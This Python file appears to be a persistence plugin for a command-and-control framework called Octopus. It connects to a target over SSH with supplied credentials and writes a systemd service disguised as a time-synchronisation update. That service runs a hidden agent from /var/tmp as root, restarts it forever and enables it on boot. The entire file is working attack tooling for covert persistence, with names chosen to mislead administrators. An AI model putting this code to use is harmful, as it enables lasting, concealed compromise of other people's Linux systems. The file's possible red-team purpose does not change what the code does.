#!/usr/bin/env python3
"""
Creates a hidden systemd service that launches the C2 agent on boot.
"""

import base64
from typing import ClassVar

from core.plugins.base import (
    KillChainStage,
    OctopusPlugin,
    PluginResult,
    PluginType,
)


class SystemdPersistence(OctopusPlugin):
    name = "systemd"
    version = "1.0.0"
    description = "Installs payload via hidden systemd service."
    plugin_type = PluginType.PERSISTENCE
    kill_chain_stage = KillChainStage.PERSISTENCE
    capabilities: ClassVar[set[str]] = {"ssh", "file_write", "service_control"}
    input_schema: ClassVar[dict[str, object]] = {
        "type": "object",
        "properties": {
            "payload_path": {"type": "string"},
            "service_name": {"type": "string"},
            "username": {"type": "string"},
            "credential_ref": {"type": "string", "format": "credential-ref"},
            "port": {"type": "integer"},
        },
        "required": ["credential_ref"],
        "additionalProperties": False,
    }

    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target")
        payload_path = kwargs.get("payload_path", "/var/tmp/.octopus_agent")
        service_name = kwargs.get("service_name", "systemd-timesyncd-update.service")
        client = kwargs.get("ssh_client")
        error: str | None = None
        owns_client = False

        if not client:
            from core.credentials import call_credential_provider, is_credential_handle, resolve_credential_handle
            from core.killchain.ssh_helpers import _ssh_connect

            username = kwargs.get("username") or kwargs.get("user")
            password = kwargs.get("credential_ref") or kwargs.get("password") or kwargs.get("pwd")
            port = int(kwargs.get("port", 22))

            if is_credential_handle(password):
                cred = resolve_credential_handle(str(password))
                if cred is None:
                    return PluginResult(success=False, error="Credential handle resolution failed")
                username = cred.username

                def _connect_with_mat(mat):
                    nonlocal client, error
                    client, error = _ssh_connect(str(target), str(mat.username), str(mat.password), port)

                call_credential_provider(cred, _connect_with_mat)
            else:
                if not target or not username or not password:
                    return PluginResult(
                        success=False,
                        error="Requires target plus serializable SSH credentials",
                    )
                client, error = _ssh_connect(str(target), str(username), str(password), port)
            if error:
                return PluginResult(success=False, error=f"SSH connection failed: {error}")
            owns_client = True

        service_content = f"""[Unit]
Description=System Time Synchronization Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
"""
        service_path = f"/etc/systemd/system/{service_name}"

        try:
            from core.killchain.ssh_helpers import _ssh_exec

            encoded = base64.b64encode(service_content.encode("utf-8")).decode("ascii")
            cmd = f"printf '%s' '{encoded}' | base64 -d > {service_path} && chmod 644 {service_path}"
            out = _ssh_exec(client, cmd)

            _ssh_exec(client, "systemctl daemon-reload")
            _ssh_exec(client, f"systemctl enable {service_name}")
            _ssh_exec(client, f"systemctl start {service_name}")

            return PluginResult(
                success=True,
                data={"service": service_name, "path": service_path, "target": target},
                output=out,
            )
        except Exception as e:
            return PluginResult(success=False, error=str(e))
        finally:
            if owns_client and client is not None:
                client.close()
